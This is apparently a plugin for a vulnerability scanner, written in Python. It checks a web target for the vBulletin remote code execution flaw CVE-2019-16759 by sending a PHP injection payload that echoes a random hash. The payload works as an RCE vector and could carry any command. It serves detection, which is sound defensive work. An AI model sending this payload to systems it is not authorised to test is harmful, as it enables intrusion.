import cores


def run(req, target, info_cb, found_cb, not_found_cb):
    # TODO add auto exploit
    # https://www.exploit-db.com/exploits/38790
    name = "vBulletin 5.6.2 - CVE-2019-16759 Remote Code Execution"
    uri = f"{target}ajax/render/widget_tabbedcontainer_tab_panel"
    check_hash = cores.gen_hash()
    payload = {
        "subWidgets[0][template]" : "widget_php",
        "subWidgets[0][config][code]" : f"echo \"{check_hash}\"; exit;"
    }

    is_vulnerable = False

    info_cb(f"Checking {name}")
    r = req.post(uri, data=payload)

    if r.status_code == 200 and check_hash in str(r.content):
        found_cb(name, uri)
        is_vulnerable = True

    if not is_vulnerable:
        not_found_cb(name)
